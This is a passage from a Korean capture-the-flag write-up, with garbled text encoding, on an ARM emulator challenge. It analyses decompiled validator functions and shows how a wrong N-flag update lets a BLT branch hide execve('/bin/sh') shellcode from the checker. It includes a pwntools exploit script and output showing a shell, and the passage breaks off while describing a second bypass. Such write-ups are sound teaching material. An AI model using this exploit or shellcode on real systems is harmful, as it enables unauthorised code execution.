em-&gt;reg-&gt;pc += <span class="number">4</span> * (<span class="number">4</span> * (v1 &gt;&gt; <span class="number">8</span>) / <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="%EB%AC%B8%EC%A0%9C-%ED%92%80%EC%9D%B4" tabindex="-1">ë¬¸ì œ í’€ì´</h2><p>ë¶„ì„í•œ ê²°ê³¼ë¥¼ ë°”íƒ•ìœ¼ë¡œ ìƒê°í•  ìˆ˜ ìˆëŠ” ìµìŠ¤í”Œë¡œì‡ ì‹œë‚˜ë¦¬ì˜¤ê°€ ë‘ ê°€ì§€ ì •ë„ ìˆìŠµë‹ˆë‹¤.</p><ol><li><code>check_code</code> í•¨ìˆ˜ì˜ <code>check_*</code> ë£¨í‹´ì—ì„œ ìµìŠ¤í”Œë¡œì‡ í”„ë¦¬ë¯¸í‹°ë¸Œ(e.g. ì„ì˜ ì“°ê¸°)ë¥¼ ì°¾ì•„ ìµìŠ¤í”Œë¡œì‡í•œë‹¤.</li><li><code>check_code</code> ì˜ ê²€ì‚¬ë¥¼ í†µê³¼í•˜ë©´ì„œ, <code>main</code> ì—ì„œ ì…ë ¥í•œ ì½”ë“œë¥¼ í˜¸ì¶œí–ˆì„ ë•Œ ìµìŠ¤í”Œë¡œì‡ì´ ìˆ˜í–‰ë˜ëŠ” ì…¸ì½”ë“œë¥¼ ì…ë ¥í•œë‹¤.</li></ol><p>ê·¸ëŸ°ë° <code>check_*</code> í•¨ìˆ˜ë“¤ì€ ëŒ€ë¶€ë¶„ ëª©ì ì§€ ë ˆì§€ìŠ¤í„°ë‚˜ ì£¼ì†Œì˜ ë²”ìœ„ì— ì œí•œì„ ë‘ê³  ìˆì–´ ìµìŠ¤í”Œë¡œì‡ í”„ë¦¬ë¯¸í‹°ë¸Œ êµ¬ì„±ì— ë„ì›€ì´ ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ ë‹¤ìŒì€ <code>check_load_store</code> í•¨ìˆ˜ì˜ ì¼ë¶€ì…ë‹ˆë‹¤. 23í–‰, 26í–‰, 32í–‰ ë“±ì„ ë³´ë©´ ëª©ì ì§€ ë ˆì§€ìŠ¤í„°ëŠ” <code>R0</code> , â€¦ , <code>R12</code> ê¹Œì§€ë§Œ ê°€ëŠ¥í•˜ë„ë¡, ì½ê³  ì“°ëŠ” ì£¼ì†ŒëŠ” <code>em-&gt;heap</code> , <code>em-&gt;stack</code> ìœ¼ë¡œ í• ë‹¹ëœ ë©”ëª¨ë¦¬ë§Œ ê°€ëŠ¥í•˜ë„ë¡ ì œí•œì„ ë‘ê³  ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_load_store</span><span class="params">(<span class="type">int</span> inst)</span><span class="comment">// 0x12000</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  bit11_0 = get_bit11_0(inst);</span><br><span class="line">  rn = get_bit16_19(inst);</span><br><span class="line">  <span class="keyword">if</span> ( rn &lt;= <span class="number">12</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    rn_val = (<span class="type">char</span> *)*(&amp;em-&gt;reg-&gt;r0 + rn);</span><br><span class="line">    <span class="keyword">if</span> ( get_bit25(inst) )                      <span class="comment">// bit25 is 1 (A bit)</span></span><br><span class="line">    &#123;</span><br><span class="line">      rm = bit11_0 &amp; <span class="number">0xF</span>;</span><br><span class="line">      <span class="keyword">if</span> ( rm &gt; <span class="number">12</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> ( get_bit24(inst) )                      <span class="comment">// bit24 is 1 (P bit)</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( get_bit23(inst) )                    <span class="comment">// bit23 is 1 (U bit)</span></span><br><span class="line">        v6 = &amp;rn_val[bit11_0];</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v6 = &amp;rn_val[-bit11_0];</span><br><span class="line">      <span class="keyword">if</span> ( get_bit20(inst) )                    <span class="comment">// bit20 is 1</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (v6 &lt; em-&gt;heap || v6 &gt; em-&gt;heap + <span class="number">4096</span>) &amp;&amp; (v6 &lt; em-&gt;<span class="built_in">stack</span> || v6 &gt; em-&gt;<span class="built_in">stack</span> + <span class="number">4096</span>) )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        rt = shr12(inst);</span><br><span class="line">        <span class="keyword">if</span> ( rt &gt; <span class="number">0xC</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        *(&amp;em-&gt;reg-&gt;r0 + rt) = *(_DWORD *)v6;   <span class="comment">// load</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (v6 &lt; em-&gt;heap || v6 &gt; em-&gt;heap + <span class="number">4096</span>) &amp;&amp; (v6 &lt; em-&gt;<span class="built_in">stack</span> || v6 &gt; em-&gt;<span class="built_in">stack</span> + <span class="number">4096</span>) )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        v13 = shr12(inst);</span><br><span class="line">        <span class="keyword">if</span> ( v13 &gt; <span class="number">0xC</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        *(_DWORD *)v6 = *(&amp;em-&gt;reg-&gt;r0 + v13);  <span class="comment">// store</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>ì‚°ìˆ  ì—°ì‚°ê³¼ ê´€ë ¨ëœ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ê²€ì‚¬í•˜ëŠ” <code>check_data_processing</code> í•¨ìˆ˜ì—ì„œë„ 9í–‰, 11í–‰ ë“±ì—ì„œ ì‚°ìˆ  ì—°ì‚°ì˜ ëª©ì ì§€ì™€ ì¸ì ë ˆì§€ìŠ¤í„°ì— ì œí•œì„ ë‘ê³  ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ°ë° ì‹¤ì œ ì—°ì‚°ì˜ ê²°ê³¼ë¥¼ ë°˜ì˜í•˜ëŠ” ì„œë¸Œë£¨í‹´ì—ì„œ í¥ë¯¸ë¡œìš´ ì½”ë“œë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_data_processing</span><span class="params">(<span class="type">int</span> inst)</span><span class="comment">// 0x117b8</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  v7 = sub_114E0(inst);</span><br><span class="line">  bit11_0 = get_bit11_0(inst);</span><br><span class="line">  bit16_19 = get_bit16_19(inst);</span><br><span class="line">  v10 = shr12(inst);</span><br><span class="line">  bit20 = get_bit20(inst);</span><br><span class="line">  <span class="keyword">if</span> ( bit16_19 &lt; <span class="number">0</span> || bit16_19 &gt; <span class="number">12</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v10 &lt; <span class="number">0</span> || v10 &gt; <span class="number">12</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">switch</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">      <span class="keyword">if</span> ( check_add(bit16_19, v4, v10, bit20) == <span class="number">-1</span> )</span><br><span class="line">        sigill(inst);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p><code>check_add</code> í•¨ìˆ˜ëŠ” <code>check_data_processing</code> í•¨ìˆ˜ì—ì„œ <code>ADD</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ê²°ê³¼ë¥¼ ë°˜ì˜í•˜ê¸° ìœ„í•´ í˜¸ì¶œí•˜ëŠ” ì„œë¸Œë£¨í‹´ì…ë‹ˆë‹¤. ì´ í•¨ìˆ˜ëŠ” ì—°ì‚° ê²°ê³¼ë¥¼ ëª©ì ì§€ ë ˆì§€ìŠ¤í„°ì— ëŒ€ì…í•˜ê³ , <code>update_zf_nf</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ <code>CPSR</code> ë ˆì§€ìŠ¤í„°ì˜ í”Œë˜ê·¸ë¥¼ ê°±ì‹ í•˜ê³  ìˆìŠµë‹ˆë‹¤. (<code>update_zf_nf</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ì¡°ê±´ <code>a4</code> ëŠ” ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ bit 20ì´ ì „ë‹¬ëœ ê°’ìœ¼ë¡œ, <code>S</code> ë¹„íŠ¸ì— í•´ë‹¹í•©ë‹ˆë‹¤)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_add</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span><span class="comment">// 0x12fb8</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// [sp+14h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  update_cf(*(&amp;em-&gt;reg-&gt;r0 + a1) + a2 &lt; *(&amp;em-&gt;reg-&gt;r0 + a1));</span><br><span class="line">  result = a2 + *(&amp;em-&gt;reg-&gt;r0 + a1);</span><br><span class="line">  <span class="keyword">if</span> ( a4 )</span><br><span class="line">    update_zf_nf(result);</span><br><span class="line">  *(&amp;em-&gt;reg-&gt;r0 + a3) = result;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>update_zf_nf</code> í•¨ìˆ˜ëŠ” ì¸ìë¡œ ë°›ì€ ì—°ì‚° ê²°ê³¼ë¥¼ <code>update_zf</code> , <code>update_nf</code> í•¨ìˆ˜ì— ì „ë‹¬í•©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">update_zf_nf</span><span class="params">(<span class="type">int</span> a1)</span><span class="comment">// 0x12d4c</span></span><br><span class="line">&#123;</span><br><span class="line">  update_zf(a1);</span><br><span class="line">  update_nf(a1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>update_nf</code> í•¨ìˆ˜ëŠ” ì—°ì‚°ì˜ ê²°ê³¼ê°€ 0ì´ ì•„ë‹ ê²½ìš° ë¹„íŠ¸ ì—°ì‚°ì„ í†µí•´ <code>em-&gt;reg-&gt;cpsr</code> ê°’ì˜ bit 31ì— 1ì„ ëŒ€ì…í•©ë‹ˆë‹¤. ì´ëŠ” <code>CPSR</code> ë ˆì§€ìŠ¤í„°ì˜ <code>N</code> ë¹„íŠ¸ì— í•´ë‹¹í•˜ëŠ”ë°, ì •ì˜ ìƒ <code>N</code> ë¹„íŠ¸ëŠ” ê²°ê³¼ê°€ ìŒìˆ˜ì¸ ê²½ìš°(ìµœìƒìœ„ ë¹„íŠ¸ê°€ 1ì¸ ê²½ìš°) 1ì´ì–´ì•¼ í•©ë‹ˆë‹¤. ë”°ë¼ì„œ <code>update_nf</code> í•¨ìˆ˜ëŠ” <code>em-&gt;reg-&gt;cpsr</code> ê°’ì„ ì‹¤ì œ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ê²°ê³¼ì™€ ë‹¤ë¥´ê²Œ ë°˜ì˜í•˜ê³  ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">update_nf</span><span class="params">(<span class="type">int</span> a1)</span>    <span class="comment">// 0x12ccc</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">    em-&gt;reg-&gt;cpsr |= <span class="number">0x80000000</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    em-&gt;reg-&gt;cpsr &amp;= <span class="number">0x70000000</span>u;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì´ë¥¼ ì´ìš©í•´ ë‹¤ìŒê³¼ ê°™ì´ ì…€ì½”ë“œë¥¼ ì…ë ¥í•˜ê³ ë„ <code>check_code</code> í•¨ìˆ˜ë¥¼ í†µê³¼í•˜ì—¬ ì‹¤í–‰í•˜ëŠ” ìµìŠ¤í”Œë¡œì‡ ì‹œë‚˜ë¦¬ì˜¤ë¥¼ êµ¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. (ë‹¨ìˆœ ì…¸ì½”ë“œë¥¼ ì…ë ¥í•˜ë©´ <code>check_syscall</code> í•¨ìˆ˜ì—ì„œ ì‹œìŠ¤í…œ ì½œ ë²ˆí˜¸ë¥¼ í•„í„°ë§í•˜ì—¬ ì¢…ë£Œí•©ë‹ˆë‹¤)</p><ol><li>ì‚°ìˆ  ì—°ì‚°ì„ í†µí•´ <code>em-&gt;reg-&gt;cpsr</code> ì˜ <code>N</code> ë¹„íŠ¸ê°€ 1ì´ ë˜ë„ë¡ í•©ë‹ˆë‹¤. (ì˜ëª» ë°˜ì˜ëœ ê²°ê³¼ì…ë‹ˆë‹¤)</li><li><code>N</code> ë¹„íŠ¸ì™€ ê´€ë ¨ëœ ì¡°ê±´ ë¶„ê¸°ë¥¼ í†µí•´ ì…¸ì½”ë“œ ë¶€ë¶„ì„ ì‹¤í–‰í•˜ì§€ ì•Šê³  ì í”„í•˜ë„ë¡ í•©ë‹ˆë‹¤.</li><li>ì‹¤ì œ ì‹¤í–‰ ì‹œì—ëŠ” <code>N</code> ë¹„íŠ¸ê°€ 0ìœ¼ë¡œ ì¡°ê±´ ë¶„ê¸°ë¥¼ ìˆ˜í–‰í•˜ì§€ ì•Šì•„, ì…¸ì½”ë“œë¥¼ ì‹¤í–‰í•˜ê²Œ ë©ë‹ˆë‹¤.</li></ol><p><code>check_cpsr</code> í•¨ìˆ˜ë¥¼ ë³´ë©´ ëª¨ë“  ì¡°ê±´ì´ êµ¬í˜„ë˜ì–´ ìˆì§€ëŠ” ì•Šì§€ë§Œ, <code>LT</code> (signed less than) ì¡°ê±´ì€ êµ¬í˜„ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ì…¸ì½”ë“œ ì´ì „ì— ê²°ê³¼ê°€ 0ì´ ì•„ë‹Œ ì‚°ìˆ  ì—°ì‚°ì„ ìˆ˜í–‰í•˜ê³  <code>BLT</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ìœ¼ë¡œ ì¡°ê±´ ë¶„ê¸°í•˜ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤. <code>check_code</code> í•¨ìˆ˜ ìƒì—ì„œëŠ” <code>update_nf</code> í•¨ìˆ˜ì—ì„œ ì˜ëª» ë°˜ì˜í•œ ê²°ê³¼ë¡œ ì¸í•´ <code>N</code> ë¹„íŠ¸ê°€ 1ì´ ë˜ì–´, <code>V</code> ë¹„íŠ¸ì™€ ê°™ì§€ ì•Šê²Œ ë˜ë¯€ë¡œ ì¡°ê±´ ë¶„ê¸°ë¥¼ ìˆ˜í–‰í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì‹¤ì œ ì‹¤í–‰ ì‹œì—ëŠ” <code>N</code> ë¹„íŠ¸ê°€ 0ìœ¼ë¡œ ì¡°ê±´ ë¶„ê¸°ë¥¼ ìˆ˜í–‰í•˜ì§€ ì•Šì„ ê²ƒì…ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_cpsr</span><span class="params">(<span class="type">int</span> inst)</span> <span class="comment">// 0x11314</span></span><br><span class="line">&#123;</span><br><span class="line">  _BOOL4 v1; <span class="comment">// r3</span></span><br><span class="line">  _BOOL4 v2; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> valid; <span class="comment">// [sp+8h] [bp-24h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> cpsr; <span class="comment">// [sp+10h] [bp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  cpsr = em-&gt;reg-&gt;cpsr;</span><br><span class="line">  <span class="keyword">switch</span> ( shr28(inst) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0u</span>:                                    <span class="comment">// equal (z == 1)</span></span><br><span class="line">      valid = cpsr &amp; <span class="number">0x40000000</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1u</span>:                                    <span class="comment">// not equal (z == 0)</span></span><br><span class="line">      valid = (cpsr &amp; <span class="number">0x40000000</span>) == <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">10u</span>:                                   <span class="comment">// signed greater than or equal (n == v)</span></span><br><span class="line">      valid = cpsr &gt;&gt; <span class="number">31</span> == (<span class="number">8</span> * cpsr) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">11u</span>:                                   <span class="comment">// signed less than (n != v)</span></span><br><span class="line">      valid = cpsr &gt;&gt; <span class="number">31</span> != (<span class="number">8</span> * cpsr) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">12u</span>:                                   <span class="comment">// signed greater than (z == 0 and n == v)</span></span><br><span class="line">      v1 = (cpsr &amp; <span class="number">0x40000000</span>) == <span class="number">0</span> &amp;&amp; cpsr &gt;&gt; <span class="number">31</span> == (<span class="number">8</span> * cpsr) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">      valid = v1;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">13u</span>:                                   <span class="comment">// signed less than or equal (z == 1 or n == v)</span></span><br><span class="line">      v2 = (cpsr &amp; <span class="number">0x40000000</span>) != <span class="number">0</span> || cpsr &gt;&gt; <span class="number">31</span> != (<span class="number">8</span> * cpsr) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">      valid = v2;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">14u</span>:                                   <span class="comment">// always</span></span><br><span class="line">      valid = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:                                    <span class="comment">// can only be executed unconditionally</span></span><br><span class="line">      valid = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> valid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ë‹¤ìŒê³¼ ê°™ì´ <code>ADDS</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ê²°ê³¼ê°€ 1ì´ ë˜ë„ë¡ í•˜ê³ , <code>BLT</code> ì˜ ë¶„ê¸° ì£¼ì†Œë¥¼ ì…¸ì½”ë“œ ì´í›„ê°€ ë˜ë„ë¡ ìµìŠ¤í”Œë¡œì‡ ì½”ë“œë¥¼ ì‘ì„±í•˜ì˜€ìŠµë‹ˆë‹¤. ìµìŠ¤í”Œë¡œì‡ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ë©´ ì…¸ì„ íšë“í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process([&quot;qemu-arm-static&quot;, &quot;-L&quot;, &quot;/usr/arm-linux-gnueabi&quot;, &quot;./app&quot;])</span></span><br><span class="line">r = remote(<span class="string">&quot;localhost&quot;</span>, <span class="number">1234</span>)</span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    payload = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    adds r0, r0, 1</span></span><br><span class="line"><span class="string">    blt exit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">shellcode:</span></span><br><span class="line"><span class="string">    add r0, pc, 12</span></span><br><span class="line"><span class="string">    mov r1, 0</span></span><br><span class="line"><span class="string">    mov r2, 0</span></span><br><span class="line"><span class="string">    mov r7, 11</span></span><br><span class="line"><span class="string">    svc 0</span></span><br><span class="line"><span class="string">    .word 0x6e69622f</span></span><br><span class="line"><span class="string">    .word 0x0068732f</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">exit:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>, arch=<span class="string">&quot;arm&quot;</span>)</span><br><span class="line"></span><br><span class="line">    r.sendafter(<span class="string">b&quot;Insert Your Code :&gt;&quot;</span>, payload)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;:&gt;&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;Secret code :&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Code? :&gt;&quot;</span>, r.recvline().strip())</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ./ex.py</span><br><span class="line">[+] Opening connection to localhost on port 1234: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> Good! Now Execute Real Machine</span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=1000(ctf) gid=1000(ctf) <span class="built_in">groups</span>=1000(ctf)</span><br></pre></td></tr></table></figure><h3 id="%EB%8B%A4%EB%A5%B8-%ED%92%80%EC%9D%B4" tabindex="-1">ë‹¤ë¥¸ í’€ì´</h3><p><code>check_code</code> í•¨ìˆ˜ë¥¼ ë³´ë©´ ë‹¤ìŒì˜ 10í–‰ì—ì„œ <code>inst</code> ê°€ 0ì¸ ê²½ìš° ë°˜ë³µë¬¸ì„ íƒˆì¶œí•©ë‹ˆë‹¤. ì´ ê²½ìš° 0ì„ ë¦¬í„´í•˜ì—¬ <code>main</code> í•¨ìˆ˜ì˜ ê²€ì‚¬ë¥¼ í†µê³¼í•˜ê¸° ë•Œë¬¸ì— ê³§ë°”ë¡œ ì…ë ¥í•œ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ARMì—ì„œ ê¸°ê³„ì–´ <code>\x00\x00\x00\x00</code> ì€ <code>ANDEQ R0, R0, R0</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì— í•´ë‹¹í•˜ëŠ”ë°, ì‹¤ì œë¡œëŠ” ì•„ë¬´ ì˜í–¥ì´ ì—†ëŠ” <code>NOP</code> ì™€ ê°™ìŠµë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_code</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">for</span> ( inst = <span class="number">-1</span>; em-&gt;reg-&gt;pc &lt; (<span class="type">unsigned</span> <span class="type">int</span>)(em-&gt;code + <span class="number">4096</span>); inst = fetched )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">char</span> *)em-&gt;reg-&gt;pc &lt; em-&gt;code )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    fetched = *(_DWORD *)em-&gt;reg-&gt;pc;</span><br><span class="line">    em-&gt;reg-&gt;pc += <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !inst )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( inst != <span class="number">-1</span> &amp;&amp; !check_cpsr(inst) )</span><br><span class="line">      sigill(inst);</span><br><span class="line">    op1 = get_class(inst);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> ( op1 != <span class="number">-1</span> )</span><br><span class="line">LABEL_23:</span><br><span class="line">      